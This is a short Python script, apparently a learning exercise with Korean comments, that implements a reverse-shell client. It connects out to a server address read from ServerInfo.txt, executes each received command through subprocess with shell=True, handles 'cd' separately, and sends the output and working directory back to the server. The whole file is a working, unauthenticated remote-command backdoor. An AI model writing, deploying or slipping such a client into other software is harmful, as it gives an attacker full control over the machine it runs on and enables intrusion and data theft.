import socket
import os
import subprocess

class Client:
    def GetServerInfo(self):
        ServerInfo = open("./ServerInfo.txt",'r')
        for line in ServerInfo:
            ServerInfoResult = line.split(" ")
        ServerInfoResult = ServerInfoResult[:2]
        ServerInfoResult[1] = int(ServerInfoResult[1])
        
        return tuple(ServerInfoResult)
        
        

    def runClient(self):
        clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        clientSocket.connect(self.GetServerInfo())

        print('연결 확인 됐습니다.')


        while True:
            data = clientSocket.recv(2048)
            # 서버 측의 cmd 명령을 받음

            if data[:2].decode("cp949") == 'cd':
            #만약 서버에서 보낸 요청에서 첫 문자가 cd 일 경우 
                os.chdir(data[3:].decode("cp949"))
            if len(data) > 0:
                # cd 명령이 아닌 다른 명령일 경우

                cmd = subprocess.Popen(data[:].decode("cp949"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # shell = True : 별도의 서브 쉘을 실행하고 해당 쉘 위에서 명령을 실행하도록 함
                # reverse connection : 서버 측에서 보낸 메세지를 확인하여 명령어로 판단하고 클라이언트에서 서브 프로세스를 생성을 하여 명령을 실행
                
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                
                server_request_str = str(output_bytes.decode("cp949"))
                clientSocket.send(str.encode(server_request_str + "\n" + str(os.getcwd()) + "> ","cp949"))
                # 클라이언트가 수행한 작업을 서버측에서 확인이 가능하도록 다시 보내줌
                # os.getcwd() : 자신의 현재 디렉토리 위치를 보여줌, 즉 프롬프트처럼 표시되도록 하는것


                print(server_request_str)
                # 서버측에서 요청한 명령을 실행

if __name__ == "__main__":
    CtlClient = Client()
    CtlClient.runClient()